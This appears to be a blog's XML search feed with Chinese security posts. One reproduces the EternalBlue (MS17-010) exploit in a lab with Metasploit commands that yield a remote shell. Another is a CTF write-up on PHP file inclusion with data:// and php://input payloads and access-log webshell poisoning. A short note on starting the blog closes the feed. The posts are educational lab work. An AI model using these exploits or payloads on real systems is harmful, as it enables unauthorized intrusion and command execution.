        <content type="html"><![CDATA[<h6 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h6><p>永恒之蓝（Eternalblue）是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。</p><p>原理：</p><p>通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的Windows主机，只要用户主机在线，即可通过该漏洞，控制用户的主机。</p><p>测试环境：</p><p>攻击机：kali</p><p>靶机：Windows7 (ip：192.168.102.128；在被渗透过程中需全程关闭防火墙)</p><p>复现过程：</p><p>1.先使用nmap对目标ip进行端口扫描，查看445端口是否有开放</p><p><img src="/images/ms17_010a.png"></p><p>2.进入msfconsole，搜索ms17-010</p><p><img src="/images/ms17_010b.png"></p><p>有两个工具可以使用，auxiliary/scanner/smb/smb_ms17_010是扫描模块；exploit/windows/smb/ms17_010_eternalblue是渗透模块；一般先进行扫描，再进行渗透。</p><p>3.使用扫描模块对靶机进行扫描</p><pre class="line-numbers language-none"><code class="language-none">进入扫描模块use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010设置目标ipset rhosts 192.168.102.128开始扫描run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/ms17_010c.png"></p><p>可以发现目标ip确实存在漏洞风险</p><p>4.使用渗透模块对目标进行渗透</p><pre class="line-numbers language-none"><code class="language-none">进入渗透模块use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue查看当前模块所需参数show options设置目标ipset rhosts 192.168.102.128开始渗透run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/ms17_010d.png"></p><p>5.在执行完run后，开启了一个reverse tcp监听器来监听本地的4444端口，运行成功后会进入一个meterpreter会话，可以通过此会话来执行系统命令、提权、获取敏感信息等；输入shell后即可切换到目标主机的windows shell</p><p><img src="/images/ms17_010f.png"></p><p>对靶机执行相关命令，发现成功执行。</p><p><img src="/images/ms17_010g.png"></p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是ms17_010漏洞的复现了，过程相对简单，但却获得了极大的系统权限，由此可见系统自动更新的重要性了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ms17_010漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOW之web入门部分wp</title>
      <link href="/2022/02/26/jian-web1/"/>
      <url>/2022/02/26/jian-web1/</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：?file=data://text/plain,<?php phpinfo();?>成功出现 phpinfo()页面</p><p><img src="/images/web_78a.png"></p><p>然后输如查询目录的指令，发现有 flag.php 文件：?file=data://text/plain,<?php system("ls");?></p><p><img src="/images/web_78b.png">]</p><p>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p><h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这次对 php 进行了过滤，但可以使用 php 短标记<?=?>和?占位符进行读出</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功读出 flag：ctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p><h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次发现还对 data 进行了替换，原本想想使用的是：</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;inputpost: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但不知为什么没有显示出来，所以查看了 hint，给的提示是访问 nginx 和 apache 下的日志文件，getshell 的方法，payload 如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 bp 抓包，将🐎写再UA头里</p><p><img src="/images/web_80a.png"></p><p><img src="/images/web_80b.png"></p><p><img src="/images/web_80c.png"></p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这次还将冒号给过滤了，不过却可以继续访问 var/log/nginx/access.log 日志文件进行传🐎,得到flag</p><p><img src="/images/web_81.png"></p><h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>条件竞争，限制了并发，先做后面的。</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web入门_文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开始</title>
      <link href="/2022/02/26/article-title/"/>
      <url>/2022/02/26/article-title/</url>
      
        <content type="html"><![CDATA[<p>经历了两天的搭建，不断的摸索和百度谷歌搜索，自己的博客也总算是搭建成功了，虽然还很菜，但也总算是跨出了第一步。</p>]]></content>
      
      
      <categories>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运行中 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
